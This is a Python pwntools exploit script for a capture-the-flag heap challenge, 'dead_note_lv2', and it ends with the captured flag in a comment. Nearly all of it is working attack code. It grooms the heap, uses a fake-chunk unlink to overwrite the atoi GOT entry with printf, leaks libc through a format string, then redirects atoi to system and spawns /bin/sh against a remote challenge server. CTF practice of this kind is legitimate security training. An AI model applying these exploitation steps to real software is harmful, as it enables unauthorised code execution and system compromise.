#!/usr/bin/env python

from pwn import *
from struct import *
from binascii import *
import re, base64


__LIBC__ = "libc.so.6"
__NAME__ = "./dead_note_lv2"
__REMOTE__ = "206.189.46.173"
__REMOTE_PORT__ = 50200
__GDB__ = """
#b * 0x400B12 
set $ptr=0x6020E0
set $num=0x602130
c
"""

context.arch = 'amd64'

if __name__ == "__main__":

	log.info("pwning %s"  % __NAME__)


	if args.REMOTE:

		log.info("remote run")
		r = remote(__REMOTE__, __REMOTE_PORT__)

	else:

		log.info("local run")

		if args.GDB:

			if args.GDB == 'attach':

				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})
				log.info("attaching gdb...")
				gdb.attach(r.pid, __GDB__)	

			else:

				r = gdb.debug("./%s" % __NAME__, __GDB__)
		else:

			r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})

	def myAdd(data=None, addNl=False):

		a = ''
		if addNl:
			a += '\n'
		r.sendlineafter("Your choice: ", "1")
		r.sendafter("Content: ", str(data) + a)
		r.recvuntil("Done~")

	def myEdit(idx=0, data=None):

		r.sendlineafter("Your choice: ", "2")
		r.sendlineafter("Index: ", str(idx))
		r.sendlineafter("Content: ", str(data))

	def myDel(idx=0):

		r.sendlineafter("Your choice: ", "3")
		r.sendlineafter("Index: ", str(idx))
		

	g_ptr = 0x6020E0

	log.info("alloc 0..10")

	for i in range(0, 8):
		myAdd(("%d" % i) * (0x88))

	prevSize = 0
	size = 0
	fd = 0x6020E0 + 8*8 - 3*8 
	bk = 0x6020E0 + 8*8 - 2*8
	fakeChunk = p64(prevSize) + p64(size) + p64(fd) + p64(bk)
	fakeChunk += 'x' * (0x80 - len(fakeChunk)) 
	fakeChunk += p64(0x90 - 0x10)
	myAdd(fakeChunk)
	myAdd('l' * (0x88))

	log.info("free...")
	
	for i in range(0, 11):
		myDel(0)

	log.info("alloc 10th")
	
	myAdd('1' * (0x88))

	
	myAdd('A' * (0x88))

	for i in range(0, 9+0x90):
		myDel(0)

	myEdit(10, "\x90")

	myDel(9)

	e = ELF(__NAME__)
	l = ELF(__LIBC__)

	myEdit(8, p64(e.got.atoi))

	myEdit(5, p64(e.plt.printf))

	r.sendlineafter("Your choice: ", "%3$p")

	data = r.recvuntil("Invalid choice!")
	data = unhexlify(re.search("0x(.*?)Invalid choice!", data).group(1)).rjust(8, '\x00')
	log.info("data len %d, data: %s" % (len(data), data))
	libcLeak = unpack(">Q", data)[0]
	log.info("data: 0x%x" % libcLeak)

	libcBase = libcLeak - 0xF7260
	log.info("libcBase = 0x%x" % libcBase)
	l.address = libcBase

	# custom edit

	r.sendlineafter("Your choice: ", "2"*2)
	r.sendlineafter("Index: ", "i"*5)
	r.sendlineafter("Content: ", p64(l.symbols['system']))

	r.sendline("/bin/sh")

	r.sendline("ls")

	r.interactive()

	# ISITDTU{838a545cbc2a33bd26f95ed1c708a1ab}

